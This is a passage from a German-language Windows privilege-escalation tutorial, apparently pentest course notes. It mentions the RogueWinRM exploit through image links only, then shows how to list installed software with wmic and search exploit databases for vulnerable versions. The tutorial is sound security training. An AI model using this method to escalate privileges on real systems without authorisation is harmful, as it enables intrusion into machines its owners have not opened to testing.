2. Einen Weg finden, um privilegierte Benutzer zu zwingen, sich mit dem erzeugten bösartigen Prozess zu verbinden und zu authentifizieren.

  
Beispiel
Wir werden den RogueWinRM-Exploit verwenden, um beide Bedingungen zu erfüllen.
https://imgur.com/4AUBQ2T
https://imgur.com/qW0KJuh
https://imgur.com/CN9TDTw

# Ausnutzen von Software mit Schwachstellen

### Unpatched Software
  
Die auf dem Zielsystem installierte Software kann verschiedene Möglichkeiten der Privilegienerweiterung bieten. Wie bei den Treibern aktualisieren Unternehmen und Benutzer diese möglicherweise nicht so oft wie das Betriebssystem. Mit dem Tool wmic kann man die auf dem Zielsystem installierte Software und ihre Versionen auflisten. Der folgende Befehl gibt die Informationen aus, die er über die installierte Software sammeln kann (es kann etwa eine Minute dauern, bis er fertig ist):
```
wmic product get name,version,vendor
```

Zu beachten ist, dass der Befehl wmic product möglicherweise nicht alle installierten Programme zurückgibt. Je nachdem, wie einige der Programme installiert wurden, sind sie hier möglicherweise nicht aufgeführt. Es lohnt sich immer, Desktop-Verknüpfungen, verfügbare Dienste oder generell alle Spuren zu überprüfen, die auf das Vorhandensein zusätzlicher Software hinweisen, die anfällig sein könnte. Sobald wir Informationen über die Produktversionen gesammelt haben, können wir jederzeit online auf Websites wie exploit-db, packet storm oder dem guten alten Google nach vorhandenen Exploits für die installierte Software suchen, neben vielen anderen.
